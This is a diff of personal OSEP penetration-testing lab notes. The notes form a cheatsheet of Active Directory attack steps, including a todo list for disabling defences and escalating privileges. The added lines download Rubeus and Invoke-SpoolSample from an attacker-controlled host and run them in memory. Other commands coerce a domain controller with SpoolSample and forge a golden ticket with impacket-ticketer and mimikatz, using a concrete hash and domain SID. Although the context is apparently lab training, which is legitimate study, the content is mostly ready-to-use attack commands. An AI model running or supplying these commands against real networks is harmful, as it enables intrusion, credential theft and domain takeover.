@@ -1,6 +1,7 @@
 `https://steflan-security.com/offensive-security-experienced-penetration-tester-osep-review/`
 
 # todo
+- add adpeas and adpeas-Light
 - take useful commands from lab writeups to navi cheatsheets
 - test sharphound in memory with powershell
 - sectioned shellcode runner
@@ -16,6 +17,7 @@
 - perform post exploit enumeration (winpeas-memory/Invoke-Seatbelt)
 - perform active directory enumeration (powerview.ps1/SharpHound.ps1)
 	- note down high value targets (domain admin)
+	- manually search for unconstrained delegation
 - privesc (then privesc again to SYSTEM if you are local admin that wants AD access)
 - disable defences
 - after getting system shell migrate to spoolsv
@@ -1683,13 +1685,13 @@ force dc to connect to application service using SpoolSample.exe
 dir \\cdc01\pipe\spoolss
 
 # with admin priv load rubeus into memory
-$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.197/rubeus.txt')
+$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.204/win/rubeus.txt')
 $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
 [Rubeus.Program]::Main("monitor /interval:5 /filteruser:DC03$ /nowrap".Split())
 
 # in a seperate terminal
 .\SpoolSample.exe  APPSRV01
-IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-SpoolSample.ps1")
+IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.204/win/Invoke-SpoolSample.ps1")
 Invoke-SpoolSample -Target '<hostname>' -CaptureServer '<hostname>'
 Invoke-SpoolSample -Target 'CDC01.prod.corp1.com' -CaptureServer 'APPSRV01.prod.corp1.com'
 
@@ -1717,10 +1719,10 @@ impacket-lookupsid prod/offsec@192.168.178.75
 ...
 # craft golden ticket
 impacket-ticketer -nthash cce9d6cd94eb31ccfbb7cc8eeadf7ce1 -domain-sid S-1-5-21-749318035-33825885-105668094 -domain prod newAdmin
-export KRB5CCNAME=$PWD/fakeuser.ccache
+export KRB5CCNAME=$PWD/newAdmin.ccache
 # alternative: inject golden ticket directly into memory
 mimikatz # kerberos::golden /domain:prod.corp1.com /sid:S-1-5-21-749318035-33825885-105668094 /rc4:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /user:newAdmin /id:500 /ptt
-
+Invoke-Mimikatz -Command '"kerberos::golden /domain:prod.corp1.com /sid:S-1-5-21-749318035-33825885-105668094 /rc4:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /user:newAdmin /id:500 /ptt"'
 sudo vim /etc/hosts
 ...
 192.168.178.70 prod.corp1.com cdc01.prod.corp1.com
